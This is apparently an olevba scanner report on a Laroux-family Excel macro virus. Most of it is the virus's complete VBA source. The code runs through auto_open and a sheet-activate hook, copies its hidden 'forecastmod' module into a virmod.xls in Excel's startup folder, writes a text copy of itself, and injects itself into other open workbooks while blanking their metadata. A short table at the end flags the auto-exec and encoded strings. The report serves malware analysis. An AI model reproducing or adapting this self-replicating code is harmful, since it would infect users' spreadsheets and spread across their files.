olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-630187d47dbae8b59581334006204296e90191e2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ЭтаКнига.cls 
in file: Virus.MSExcel.Laroux-based-630187d47dbae8b59581334006204296e90191e2 - OLE stream: '_VBA_PROJECT_CUR/VBA/ЭтаКнига'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист1.cls 
in file: Virus.MSExcel.Laroux-based-630187d47dbae8b59581334006204296e90191e2 - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист2.cls 
in file: Virus.MSExcel.Laroux-based-630187d47dbae8b59581334006204296e90191e2 - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Лист3.cls 
in file: Virus.MSExcel.Laroux-based-630187d47dbae8b59581334006204296e90191e2 - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO forecastmod.bas 
in file: Virus.MSExcel.Laroux-based-630187d47dbae8b59581334006204296e90191e2 - OLE stream: '_VBA_PROJECT_CUR/VBA/forecastmod'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    Randomize Timer
    On Error Resume Next
    If Application.Workbooks.Count = 1 And ActiveWorkbook.Worksheets.Count = 0 Then Application.Workbooks.Add
    Application.OnSheetActivate = "forecast"
End Sub

Sub Forecast()
Attribute Forecast.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = False
    If StrComp(Dir(Application.StartupPath & "\" & "virmod.xls"), "virmod.xls", 1) = 0 Then
        ck_txtfile
        t$ = "virmod"
        s$ = get_txtfile(get_parent_of_start & "\", t$)
        If ActiveWorkbook.Modules.Count = 0 Then
            activewbn$ = ActiveWorkbook.Name
            activeshn$ = ActiveSheet.Name
            If (StrComp(Workbooks(activewbn$).Sheets(1).Name, "forecastmod", 1) <> 0) And (StrComp(Dir(s$), t$, 1) = 0) Then
                ActiveWorkbook.Modules.Add before:=Workbooks(activewbn$).Sheets(1)
                With ActiveWorkbook.Modules(1)
                    .Name = "forecastmod"
                    .InsertFile s$, True
                    .Visible = False
                End With
                Workbooks(activewbn$).Worksheets(activeshn$).Activate
            End If
        End If
    Else
        start$ = Application.StartupPath
        If ActiveWorkbook.Modules.Count = 1 Then
            s$ = Application.StartupPath & "/" & "virmod.xls"
            cname$ = ActiveWorkbook.Name
            With Sheets("forecastmod")
                .Visible = True
                .Select
                .Copy
            End With
            With ActiveWorkbook
                .Title = ""
                .Subject = ""
                .Author = ""
                .Keywords = ""
                .Comments = ""
            End With
            activewbn$ = ActiveWorkbook.Name
            cwd$ = CurDir()
            ChDir Application.StartupPath
            ActiveWindow.Visible = False
            Workbooks(activewbn$).SaveAs FileName:=s$, FileFormat:=xlNormal, password:="", writeResPassword:="", ReadOnlyRecommended:=False, CreateBackup:=False
            ChDir cwd$
            Workbooks(cname$).Sheets("forecastmod").Visible = False
        End If
    End If
    With Application
        .ScreenUpdating = True
        .OnSheetActivate = "virmod.xls!forecast"
    End With
End Sub

Sub ck_txtfile()
Attribute ck_txtfile.VB_ProcData.VB_Invoke_Func = " \n14"
    t$ = "virmod"
    s$ = get_txtfile(get_parent_of_start & "\", t$)
    If StrComp(Dir(s$), t$, 1) <> 0 Then
        Workbooks("virmod.xls").Sheets("forecastmod").SaveAs FileName:=s$, FileFormat:=xlText, CreateBackup:=False
    End If
End Sub

Function get_txtfile(s$, t$)
Attribute get_txtfile.VB_ProcData.VB_Invoke_Func = " \n14"
    r$ = Right$("00" & CStr(Rnd() * 100), 2)
    t$ = t$ & r$ & ".txt"
    get_txtfile = s$ & t$
End Function

Function get_parent_of_start()
Attribute get_parent_of_start.VB_ProcData.VB_Invoke_Func = " \n14"
    p$ = Application.StartupPath
    m = 0
    n = InStr(1, p$, "\", 1)
    While n > 0 And n < Len(p$)
        m = n
        n = InStr(m + 1, p$, "\", 1)
    Wend
    If m > 1 Then
        get_parent_of_start = Left$(p$, m - 1)
    Else
        get_parent_of_start = ""
    End If
End Function








-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

